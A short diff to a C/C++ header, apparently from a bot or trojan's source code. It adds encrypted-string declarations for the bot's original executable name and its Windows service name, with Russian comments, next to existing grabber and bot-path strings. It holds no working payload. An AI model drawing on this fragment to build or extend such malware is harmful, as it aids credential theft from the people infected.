@@ -39,6 +39,17 @@ string GetStr(const char* EncryptedStr);
 extern CSSTR StrBotGlobalMutexName[];
 
 
+// Оригинальное имя ехе файла бота
+extern CSSTR EStrOriginalBotExeName[];
+
+
+// Имя сервиса
+extern CSSTR EStrServiceName[];
+
+// Оригинальное имя ехе файла сервиса бота
+//extern CSSTR EStrOriginalBotServiceExeName[];
+
+
 
 extern CSSTR StrBotWorkPath[];
 extern CSSTR StrGrabberPath[];
